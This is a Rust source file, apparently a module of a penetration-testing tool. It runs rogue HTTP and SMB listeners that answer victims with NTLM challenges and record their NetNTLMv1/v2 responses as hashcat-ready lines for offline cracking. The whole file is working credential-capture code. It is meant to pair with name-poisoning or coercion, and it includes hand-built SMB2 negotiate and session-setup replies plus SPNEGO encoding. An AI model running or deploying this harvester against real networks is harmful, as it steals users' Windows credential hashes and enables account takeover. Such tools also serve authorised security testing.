//! NetNTLM hash capture. Pairs with `respond` (or any coercion): once a victim
//! is pointed here, an HTTP and an SMB listener issue an NTLM challenge and
//! record the NetNTLMv1/v2 response in hashcat format.
//!
//! HTTP capture is reliable and the common WPAD/intranet path. SMB capture is
//! best-effort: it speaks just enough SMB2 + SPNEGO to drive a client to send
//! its Type-3, and also captures any NTLMSSP Type-3 seen on the connection.

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use base64::Engine;

use crate::log::Logger;
use crate::ntlm::{self, find_ntlmssp, parse_type3};

pub fn run(log: Option<String>, running: Arc<AtomicBool>) -> std::io::Result<()> {
    let logger = Arc::new(Logger::new(log.as_deref()));
    println!("capturing NetNTLM on HTTP/80 and SMB/445 (Ctrl+C to stop)...\n");

    let mut handles = Vec::new();
    for (port, kind) in [(80u16, Kind::Http), (445u16, Kind::Smb)] {
        match TcpListener::bind(("0.0.0.0", port)) {
            Ok(listener) => {
                listener.set_nonblocking(true)?;
                let logger = logger.clone();
                let r = running.clone();
                handles.push(thread::spawn(move || accept_loop(listener, kind, logger, r)));
            }
            Err(e) => eprintln!("warning: {kind:?} disabled — cannot bind :{port} ({e})"),
        }
    }
    if handles.is_empty() {
        return Err(crate::net::err("no capture listeners could start (need root?)"));
    }
    while running.load(Ordering::SeqCst) {
        thread::sleep(Duration::from_millis(200));
    }
    for h in handles {
        let _ = h.join();
    }
    Ok(())
}

#[derive(Debug, Clone, Copy)]
enum Kind {
    Http,
    Smb,
}

fn accept_loop(listener: TcpListener, kind: Kind, logger: Arc<Logger>, running: Arc<AtomicBool>) {
    while running.load(Ordering::SeqCst) {
        match listener.accept() {
            Ok((stream, addr)) => {
                let logger = logger.clone();
                let src = addr.ip().to_string();
                thread::spawn(move || {
                    let _ = stream.set_read_timeout(Some(Duration::from_secs(5)));
                    match kind {
                        Kind::Http => handle_http(stream, &src, &logger),
                        Kind::Smb => handle_smb(stream, &src, &logger),
                    }
                });
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                thread::sleep(Duration::from_millis(150));
            }
            Err(_) => break,
        }
    }
}

fn capture(logger: &Logger, src: &str, proto: &str, msg: &[u8]) -> bool {
    if let Some(hit) = parse_type3(msg) {
        let line = hit.hashcat();
        println!("[{proto}] captured {} from {src}", hit.mode());
        println!("        {line}");
        logger.event(
            "netntlm",
            src,
            serde_json::json!({
                "proto": proto,
                "mode": hit.mode(),
                "workstation": hit.workstation,
                "hashcat": line,
            }),
        );
        true
    } else {
        false
    }
}

// --- HTTP ---------------------------------------------------------------

fn handle_http(mut stream: TcpStream, src: &str, logger: &Logger) {
    for _ in 0..4 {
        let Some(req) = read_http_head(&mut stream) else { return };
        let auth = req
            .lines()
            .find(|l| l.to_ascii_lowercase().starts_with("authorization: ntlm "));

        match auth.and_then(|l| l.splitn(3, ' ').nth(2)) {
            None => {
                let _ = stream.write_all(
                    b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\n\
                      Content-Length: 0\r\nConnection: keep-alive\r\n\r\n",
                );
            }
            Some(b64) => {
                let Ok(msg) = base64::engine::general_purpose::STANDARD.decode(b64.trim()) else {
                    return;
                };
                match msg.get(8).copied() {
                    Some(1) => {
                        // Type-1 -> send Type-2 challenge.
                        let t2 = base64::engine::general_purpose::STANDARD.encode(ntlm::build_type2());
                        let resp = format!(
                            "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {t2}\r\n\
                             Content-Length: 0\r\nConnection: keep-alive\r\n\r\n"
                        );
                        let _ = stream.write_all(resp.as_bytes());
                    }
                    Some(3) => {
                        capture(logger, src, "HTTP", &msg);
                        let _ = stream.write_all(
                            b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok",
                        );
                        return;
                    }
                    _ => return,
                }
            }
        }
    }
}

fn read_http_head(stream: &mut TcpStream) -> Option<String> {
    let mut buf = Vec::new();
    let mut byte = [0u8; 1];
    while buf.len() < 16_384 {
        match stream.read(&mut byte) {
            Ok(0) => return None,
            Ok(_) => {
                buf.push(byte[0]);
                if buf.ends_with(b"\r\n\r\n") {
                    return Some(String::from_utf8_lossy(&buf).into_owned());
                }
            }
            Err(_) => return None,
        }
    }
    None
}

// --- SMB (best-effort) --------------------------------------------------

const SMB2_NEGOTIATE: u16 = 0x0000;
const SMB2_SESSION_SETUP: u16 = 0x0001;
const STATUS_MORE_PROCESSING: u32 = 0xC000_0016;

fn handle_smb(mut stream: TcpStream, src: &str, logger: &Logger) {
    for _ in 0..6 {
        let Some(msg) = read_smb_message(&mut stream) else { return };

        // Opportunistic: capture a Type-3 wherever it appears.
        if let Some(ssp) = find_ntlmssp(&msg) {
            if ssp.get(8).copied() == Some(3) && capture(logger, src, "SMB", ssp) {
                return;
            }
        }
        if msg.len() < 68 {
            return;
        }
        let command = u16::from_le_bytes([msg[16], msg[17]]); // SMB2 header cmd @ +12 (after 4-byte NBSS)
        let reply = match command {
            SMB2_NEGOTIATE => smb_negotiate_reply(&msg),
            SMB2_SESSION_SETUP => smb_session_setup_reply(&msg),
            _ => return,
        };
        if stream.write_all(&reply).is_err() {
            return;
        }
    }
}

/// Read one NBSS-framed SMB message (4-byte header: 1 zero + 3-byte length).
fn read_smb_message(stream: &mut TcpStream) -> Option<Vec<u8>> {
    let mut hdr = [0u8; 4];
    stream.read_exact(&mut hdr).ok()?;
    let len = ((hdr[1] as usize) << 16) | ((hdr[2] as usize) << 8) | hdr[3] as usize;
    if len == 0 || len > 1_048_576 {
        return None;
    }
    let mut body = vec![0u8; len];
    stream.read_exact(&mut body).ok()?;
    let mut full = hdr.to_vec();
    full.extend_from_slice(&body);
    Some(full)
}

fn nbss_wrap(payload: &[u8]) -> Vec<u8> {
    let n = payload.len();
    let mut out = vec![0x00, (n >> 16) as u8, (n >> 8) as u8, n as u8];
    out.extend_from_slice(payload);
    out
}

/// Build an SMB2 response header from the request header, flipping to a
/// server-to-redir reply and setting `status`.
fn smb2_resp_header(req: &[u8], status: u32) -> Vec<u8> {
    let mut h = req[4..68].to_vec(); // copy the 64-byte SMB2 header
    h[8..12].copy_from_slice(&status.to_le_bytes()); // Status
    let flags = u32::from_le_bytes([h[16], h[17], h[18], h[19]]) | 0x0000_0001; // SERVER_TO_REDIR
    h[16..20].copy_from_slice(&flags.to_le_bytes());
    h
}

fn smb_negotiate_reply(req: &[u8]) -> Vec<u8> {
    let sec = spnego_init_ntlm();
    let mut body = Vec::new();
    body.extend_from_slice(&65u16.to_le_bytes()); // StructureSize
    body.extend_from_slice(&1u16.to_le_bytes()); // SecurityMode: signing enabled
    body.extend_from_slice(&0x0202u16.to_le_bytes()); // Dialect 2.0.2
    body.extend_from_slice(&[0u8; 2]); // Reserved
    body.extend_from_slice(&[0x11; 16]); // ServerGuid
    body.extend_from_slice(&[0u8; 4]); // Capabilities
    body.extend_from_slice(&0x0010_0000u32.to_le_bytes()); // MaxTransactSize
    body.extend_from_slice(&0x0010_0000u32.to_le_bytes()); // MaxReadSize
    body.extend_from_slice(&0x0010_0000u32.to_le_bytes()); // MaxWriteSize
    body.extend_from_slice(&[0u8; 8]); // SystemTime
    body.extend_from_slice(&[0u8; 8]); // ServerStartTime
    let sec_off = (64 + 64) as u16; // header(64) + this struct(64 before buffer)
    body.extend_from_slice(&sec_off.to_le_bytes()); // SecurityBufferOffset
    body.extend_from_slice(&(sec.len() as u16).to_le_bytes()); // SecurityBufferLength
    body.extend_from_slice(&[0u8; 4]); // Reserved2
    body.extend_from_slice(&sec);

    let mut pkt = smb2_resp_header(req, 0);
    pkt.extend_from_slice(&body);
    nbss_wrap(&pkt)
}

fn smb_session_setup_reply(req: &[u8]) -> Vec<u8> {
    let sec = spnego_resp_challenge(&ntlm::build_type2());
    let mut body = Vec::new();
    body.extend_from_slice(&9u16.to_le_bytes()); // StructureSize
    body.extend_from_slice(&0u16.to_le_bytes()); // SessionFlags
    let sec_off = (64 + 8) as u16;
    body.extend_from_slice(&sec_off.to_le_bytes()); // SecurityBufferOffset
    body.extend_from_slice(&(sec.len() as u16).to_le_bytes()); // SecurityBufferLength
    body.extend_from_slice(&sec);

    let mut pkt = smb2_resp_header(req, STATUS_MORE_PROCESSING);
    pkt.extend_from_slice(&body);
    nbss_wrap(&pkt)
}

// --- Minimal SPNEGO/DER --------------------------------------------------

const NTLMSSP_OID: &[u8] = &[0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a];
const SPNEGO_OID: &[u8] = &[0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02];

fn der_len(n: usize) -> Vec<u8> {
    if n < 0x80 {
        vec![n as u8]
    } else if n < 0x100 {
        vec![0x81, n as u8]
    } else {
        vec![0x82, (n >> 8) as u8, n as u8]
    }
}

fn tlv(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut v = vec![tag];
    v.extend(der_len(content.len()));
    v.extend_from_slice(content);
    v
}

/// GSSAPI InitialContextToken advertising NTLMSSP (negotiate response blob).
fn spnego_init_ntlm() -> Vec<u8> {
    let mech_types = tlv(0x30, NTLMSSP_OID); // SEQUENCE OF MechType
    let a0 = tlv(0xA0, &mech_types); // mechTypes [0]
    let neg_init = tlv(0x30, &a0); // NegTokenInit SEQUENCE
    let a0_outer = tlv(0xA0, &neg_init); // [0] NegTokenInit
    let mut inner = Vec::new();
    inner.extend_from_slice(SPNEGO_OID);
    inner.extend_from_slice(&a0_outer);
    tlv(0x60, &inner) // [APPLICATION 0]
}

/// NegTokenResp carrying the NTLMSSP Type-2 as the response token.
fn spnego_resp_challenge(type2: &[u8]) -> Vec<u8> {
    let neg_result = tlv(0xA0, &tlv(0x0A, &[0x01])); // accept-incomplete (1)
    let supported = tlv(0xA1, NTLMSSP_OID); // supportedMech
    let token = tlv(0xA2, &tlv(0x04, type2)); // responseToken OCTET STRING
    let mut seq = Vec::new();
    seq.extend_from_slice(&neg_result);
    seq.extend_from_slice(&supported);
    seq.extend_from_slice(&token);
    tlv(0xA1, &tlv(0x30, &seq)) // [1] NegTokenResp
}
